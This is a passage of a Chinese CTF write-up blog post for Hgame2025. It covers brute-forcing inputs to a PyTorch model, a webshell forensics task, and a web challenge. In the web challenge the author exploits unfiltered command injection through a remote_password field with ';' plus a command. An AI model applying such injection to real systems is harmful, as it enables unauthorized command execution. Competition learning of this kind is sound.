<span class="hljs-number">0.1143</span>,  <span class="hljs-number">0.2291</span>, -<span class="hljs-number">0.1281</span>,  <span class="hljs-number">0.1897</span>,  <span class="hljs-number">0.0182</span>,<br>               <span class="hljs-number">0.0472</span>, -<span class="hljs-number">0.2510</span>],<br>             [ <span class="hljs-number">0.0527</span>, -<span class="hljs-number">0.0044</span>,  <span class="hljs-number">0.2950</span>,  <span class="hljs-number">0.1157</span>,  <span class="hljs-number">0.0345</span>,  <span class="hljs-number">0.0579</span>,  <span class="hljs-number">0.2961</span>, -<span class="hljs-number">0.0682</span>,<br>               <span class="hljs-number">0.0336</span>, -<span class="hljs-number">0.0558</span>],<br>             [-<span class="hljs-number">0.2985</span>,  <span class="hljs-number">0.1062</span>, -<span class="hljs-number">0.2369</span>,  <span class="hljs-number">0.0633</span>, -<span class="hljs-number">0.1295</span>,  <span class="hljs-number">0.2976</span>,  <span class="hljs-number">0.0094</span>, -<span class="hljs-number">0.3112</span>,<br>              -<span class="hljs-number">0.2357</span>, -<span class="hljs-number">0.1416</span>],<br>             [ <span class="hljs-number">0.1578</span>,  <span class="hljs-number">0.2312</span>,  <span class="hljs-number">0.2572</span>,  <span class="hljs-number">0.2929</span>,  <span class="hljs-number">0.0181</span>, -<span class="hljs-number">0.2295</span>, -<span class="hljs-number">0.2644</span>,  <span class="hljs-number">0.0538</span>,<br>              -<span class="hljs-number">0.2774</span>, -<span class="hljs-number">0.2838</span>]<br>], dtype=torch.float32)<br><br>bias = torch.tensor([<span class="hljs-number">0.1209</span>,  <span class="hljs-number">0.0082</span>, -<span class="hljs-number">0.2783</span>, -<span class="hljs-number">0.3144</span>, -<span class="hljs-number">0.1505</span>,  <span class="hljs-number">0.2989</span>,  <span class="hljs-number">0.0367</span>,  <span class="hljs-number">0.2310</span>,<br>          <span class="hljs-number">0.0135</span>,  <span class="hljs-number">0.2238</span>], dtype=torch.float32)<br><br>out_features, in_features = weight.shape<br><br>mW = torch.mean(weight)<br><br>mB = torch.mean(bias)<br><br>c = (target_mean - mB) / (in_features * mW)<br><br>x = torch.full((<span class="hljs-number">1</span>, in_features), c, dtype=torch.float32)<br><br>x1 = torch.nn.functional.linear(x, weight, bias)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Computed constant input x:&quot;</span>)<br><span class="hljs-built_in">print</span>(x)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Weight mean:&quot;</span>, mW.item(), <span class="hljs-string">&quot;  Bias mean:&quot;</span>, mB.item())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Computed constant c:&quot;</span>, c.item())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Linear layer output x1:&quot;</span>)<br><span class="hljs-built_in">print</span>(x1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Mean of x1:&quot;</span>, torch.mean(x1).item())<br><br><span class="hljs-built_in">print</span>(torch.allclose(torch.mean(x1), torch.tensor(target_mean), rtol=<span class="hljs-number">1e-05</span>, atol=<span class="hljs-number">0.0001</span>))<br></code></pre></td></tr></table></figure>
+
+<p>然而这里得出来的张量理论上应该是对的但输入后还是错的，未出现预期 flag。又改数据试了一会，感觉可能是题目所谓的时间错位加密，中间还有一道程序导致了 entity 中结果的偏移，所以最后决定以理论正确的输入为基础，0.01 的步长，正负 0.60 遍历一遍（每次变化对应 security 部分的平均值变化量为 0.0001）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> math<br><br>entity = torch.jit.load(<span class="hljs-string">&#x27;entity.pt&#x27;</span>, map_location=torch.device(<span class="hljs-string">&#x27;cpu&#x27;</span>))<br>entity.<span class="hljs-built_in">eval</span>()<br><br>weight1 = [[-<span class="hljs-number">0.1905</span>, -<span class="hljs-number">0.2279</span>, -<span class="hljs-number">0.1038</span>,  <span class="hljs-number">0.2425</span>,  <span class="hljs-number">0.1687</span>, -<span class="hljs-number">0.0876</span>, -<span class="hljs-number">0.0443</span>,  <span class="hljs-number">0.1849</span>,<br>          <span class="hljs-number">0.1420</span>,  <span class="hljs-number">0.2552</span>],<br>        [ <span class="hljs-number">0.1606</span>, -<span class="hljs-number">0.2255</span>,  <span class="hljs-number">0.2935</span>, -<span class="hljs-number">0.1483</span>,  <span class="hljs-number">0.0447</span>, -<span class="hljs-number">0.0528</span>,  <span class="hljs-number">0.3090</span>, -<span class="hljs-number">0.0193</span>,<br>         -<span class="hljs-number">0.0874</span>, -<span class="hljs-number">0.1935</span>],<br>        [-<span class="hljs-number">0.2987</span>, -<span class="hljs-number">0.3123</span>,  <span class="hljs-number">0.1831</span>,  <span class="hljs-number">0.2289</span>, -<span class="hljs-number">0.1729</span>,  <span class="hljs-number">0.0225</span>, -<span class="hljs-number">0.1234</span>,  <span class="hljs-number">0.1704</span>,<br>          <span class="hljs-number">0.2700</span>,  <span class="hljs-number">0.1911</span>],<br>        [ <span class="hljs-number">0.1425</span>,  <span class="hljs-number">0.0841</span>, -<span class="hljs-number">0.2787</span>, -<span class="hljs-number">0.0964</span>, -<span class="hljs-number">0.2263</span>, -<span class="hljs-number">0.2821</span>,  <span class="hljs-number">0.0173</span>,  <span class="hljs-number">0.0279</span>,<br>          <span class="hljs-number">0.2843</span>,  <span class="hljs-number">0.1745</span>],<br>        [ <span class="hljs-number">0.1492</span>, -<span class="hljs-number">0.1212</span>, -<span class="hljs-number">0.3122</span>, -<span class="hljs-number">0.0605</span>,  <span class="hljs-number">0.2146</span>, -<span class="hljs-number">0.2049</span>, -<span class="hljs-number">0.2629</span>,  <span class="hljs-number">0.2081</span>,<br>          <span class="hljs-number">0.2239</span>,  <span class="hljs-number">0.0339</span>],<br>        [ <span class="hljs-number">0.3045</span>, -<span class="hljs-number">0.3089</span>, -<span class="hljs-number">0.0101</span>,  <span class="hljs-number">0.0076</span>,  <span class="hljs-number">0.1810</span>,  <span class="hljs-number">0.2333</span>, -<span class="hljs-number">0.0124</span>,  <span class="hljs-number">0.0553</span>,<br>          <span class="hljs-number">0.1279</span>, -<span class="hljs-number">0.2548</span>],<br>        [-<span class="hljs-number">0.2894</span>,  <span class="hljs-number">0.0390</span>, -<span class="hljs-number">0.2061</span>,  <span class="hljs-number">0.1143</span>,  <span class="hljs-number">0.2291</span>, -<span class="hljs-number">0.1281</span>,  <span class="hljs-number">0.1897</span>,  <span class="hljs-number">0.0182</span>,<br>          <span class="hljs-number">0.0472</span>, -<span class="hljs-number">0.2510</span>],<br>        [ <span class="hljs-number">0.0527</span>, -<span class="hljs-number">0.0044</span>,  <span class="hljs-number">0.2950</span>,  <span class="hljs-number">0.1157</span>,  <span class="hljs-number">0.0345</span>,  <span class="hljs-number">0.0579</span>,  <span class="hljs-number">0.2961</span>, -<span class="hljs-number">0.0682</span>,<br>          <span class="hljs-number">0.0336</span>, -<span class="hljs-number">0.0558</span>],<br>        [-<span class="hljs-number">0.2985</span>,  <span class="hljs-number">0.1062</span>, -<span class="hljs-number">0.2369</span>,  <span class="hljs-number">0.0633</span>, -<span class="hljs-number">0.1295</span>,  <span class="hljs-number">0.2976</span>,  <span class="hljs-number">0.0094</span>, -<span class="hljs-number">0.3112</span>,<br>         -<span class="hljs-number">0.2357</span>, -<span class="hljs-number">0.1416</span>],<br>        [ <span class="hljs-number">0.1578</span>,  <span class="hljs-number">0.2312</span>,  <span class="hljs-number">0.2572</span>,  <span class="hljs-number">0.2929</span>,  <span class="hljs-number">0.0181</span>, -<span class="hljs-number">0.2295</span>, -<span class="hljs-number">0.2644</span>,  <span class="hljs-number">0.0538</span>,<br>         -<span class="hljs-number">0.2774</span>, -<span class="hljs-number">0.2838</span>]]<br>bias1 = [<span class="hljs-number">0.1209</span>,  <span class="hljs-number">0.0082</span>, -<span class="hljs-number">0.2783</span>, -<span class="hljs-number">0.3144</span>, -<span class="hljs-number">0.1505</span>,  <span class="hljs-number">0.2989</span>,  <span class="hljs-number">0.0367</span>,  <span class="hljs-number">0.2310</span>,<br>         <span class="hljs-number">0.0135</span>,  <span class="hljs-number">0.2238</span>]<br>torch_weight1 = torch.tensor(weight1, dtype=torch.float32)<br>torch_bias1   = torch.tensor(bias1, dtype=torch.float32)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-<span class="hljs-number">60</span>,<span class="hljs-number">60</span>):<br>    temp = <span class="hljs-number">378.3501922607422</span><br>    input_tensor = torch.tensor([[temp+i*<span class="hljs-number">0.01</span>, <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>,<br>                                      <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>,<br>                                      <span class="hljs-number">136.4001922607422</span>, <span class="hljs-number">136.4001922607422</span>]], dtype=torch.float32)<br><br>    x0 = torch.nn.functional.linear(input_tensor,torch_weight1,torch_bias1)<br>    <span class="hljs-built_in">print</span>(torch.mean(torch_weight1))<br>    <span class="hljs-built_in">print</span>(torch.mean(torch_bias1))<br>    <span class="hljs-built_in">print</span>(torch.mean(x0))<br>    <span class="hljs-built_in">print</span>(x0)<br>    f = torch.allclose(torch.mean(x0), torch.tensor(<span class="hljs-number">0.31415000000000004</span>), rtol=<span class="hljs-number">1.0000000000000001e-05</span>, atol=<span class="hljs-number">0.0001</span>)<br>    <span class="hljs-built_in">print</span>(f)<br>    output = entity(input_tensor)<br>    <span class="hljs-built_in">print</span>(output)<br></code></pre></td></tr></table></figure>
+
+<p>最后终于跑出了结果，0.3141 -&gt; 0.3163 偏移了 0.0022</p>
+<p><img src="/img/Hgame2025WP/CeSSbmVXHoGFgSxDTKycNAmDn4c.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="Computer-cleaner"><a href="#Computer-cleaner" class="headerlink" title="Computer cleaner"></a>Computer cleaner</h3><p>开虚拟机遇到一点问题，我的是 17.0，出题人应该是 17.5 及以上吧，浅改一下配置文件。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">找到攻击者的webshell连接密码<br>对攻击者进行简单溯源<br>排查攻击者目的<br></code></pre></td></tr></table></figure>
+
+<p>按题目所给三步来即可得到 flag</p>
+<p><img src="/img/Hgame2025WP/Ie7zbpP1Bo2l74xOOiEckwfznBf.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/Hgame2025WP/AKJPbE7N6oJAlyxl640c3STQnNH.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/Hgame2025WP/D85YbuUlTotiSmxr4vbc0YgqnZc.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/Hgame2025WP/IhUrbfLVQoiedVxtZtAci61Mnpd.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="Level-21096-HoneyPot"><a href="#Level-21096-HoneyPot" class="headerlink" title="Level 21096 HoneyPot"></a>Level 21096 HoneyPot</h3><p>目录扫描，存在 <code>/flag</code>，直接访问为 <code>fake_flag</code></p>
+<p>审计附件源码 <code>main.go</code>，主要实现了数据库连接测试、导入、查询这几个功能，发现存在函数 <code>sanitizeInput()</code> 和 <code>validateImportConfig()</code> 对各种输入严格过滤。</p>
+<p>在注释的附近发现各个参数先拼接为字符串 command，再用 <code>cmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command)</code> 执行命令，其中参数 <code>config.RemotePassword</code> 遗漏了对输入的过滤，从而可以实施命令注入。</p>
+<p>点击导入数据，截包，在 <code>remote_password</code> 字段处加 <code>;</code> 来截断前面的命令，然后执行 <code>/writeflag</code></p>
+<p><img src="/img/Hgame2025WP/RXldbCkq0o0DBDxX4sOcmusSnbf.png" srcset="/img/loading.gif" lazyload></p>
+<p>再访问 <code>/flag</code>，得到 flag</p>
+<p><img src="/img/Hgame2025WP/H4bcbHBq2o9jYWxf5QhcovWmnIb.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+        <a href="/tags/WriteUp/" class="print-no-link">#WriteUp</a>
+      
+        <a href="/tags/misc/" class="print-no-link">#misc</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Hgame2025 WP</div>
+      <div>http://5i1encee.top/2025/03/02/Hgame2025WP/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>5i1encee</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/02/Hgame2025%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" title="Hgame2025 部分赛题复现">
+                        <span class="hidden-mobile">Hgame2025 部分赛题复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"sYa0TwEtqgwqBctM2qchGbMG-gzGzoHsz","appKey":"Et6unsKpmF1YFlS3U5IE9nlB","path":"window.location.pathname","placeholder":"请友好交流哦~","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":false,"serverURLs":"https://sya0twet.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <footer class="mt-4"> <font size="2" face="Georgia"> <div class="text-center py-3"> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
